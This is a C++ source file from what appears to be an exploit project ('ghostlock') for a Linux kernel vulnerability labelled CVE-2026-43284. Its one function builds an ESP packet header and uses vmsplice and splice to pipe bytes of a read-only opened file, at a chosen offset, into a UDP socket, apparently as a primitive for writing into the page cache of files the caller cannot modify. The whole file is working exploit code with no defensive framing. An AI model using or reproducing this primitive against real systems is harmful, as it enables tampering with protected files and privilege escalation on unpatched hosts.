#include "backend/cve_2026_43284/lib/raw_esp.hpp"

#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <unistd.h>

#include <cerrno>
#include <cstring>

namespace ghostlock::backend::cve_2026_43284::lib {
namespace {
void set_error(RawEspError *error, const char *stage) noexcept {
    if (error == nullptr) return;
    error->stage = stage;
    error->err = errno;
}
}  // namespace

bool esp_write_block(const RawEspEndpoint &endpoint, const RawEspWrite &write, RawEspError *error) noexcept {
    if (error != nullptr) {
        error->stage = nullptr;
        error->err = 0;
    }
    if (endpoint.sock < 0 || write.path == nullptr || write.iv == nullptr) {
        if (error != nullptr) {
            error->stage = "raw-invalid-args";
            error->err = EINVAL;
        }
        return false;
    }

    const int file = ::open(write.path, O_RDONLY | O_CLOEXEC);
    if (file < 0) {
        set_error(error, "raw-open");
        return false;
    }

    int pipe_fds[2] = {-1, -1};
    if (::pipe(pipe_fds) < 0) {
        set_error(error, "raw-pipe");
        ::close(file);
        return false;
    }

    std::uint8_t header[24] = {};
    const std::uint32_t spi = htonl(endpoint.spi);
    const std::uint32_t sequence = htonl(write.sequence);
    std::memcpy(header, &spi, 4U);
    std::memcpy(header + 4U, &sequence, 4U);
    std::memcpy(header + 8U, write.iv, 16U);

    iovec vector{};
    vector.iov_base = header;
    vector.iov_len = sizeof(header);

    bool ok = true;
    if (::vmsplice(pipe_fds[1], &vector, 1U, SPLICE_F_GIFT) != static_cast<ssize_t>(sizeof(header))) {
        set_error(error, "raw-vmsplice");
        ok = false;
    }
    off_t at = write.offset;
    if (ok && ::splice(file, &at, pipe_fds[1], nullptr, 16, SPLICE_F_MOVE) != 16) {
        set_error(error, "raw-splice-file");
        ok = false;
    }
    if (ok && ::splice(pipe_fds[0], nullptr, endpoint.sock, nullptr, 40, 0) != 40) {
        set_error(error, "raw-splice-udp");
        ok = false;
    }

    ::close(pipe_fds[0]);
    ::close(pipe_fds[1]);
    ::close(file);
    return ok;
}

}  // namespace ghostlock::backend::cve_2026_43284::lib
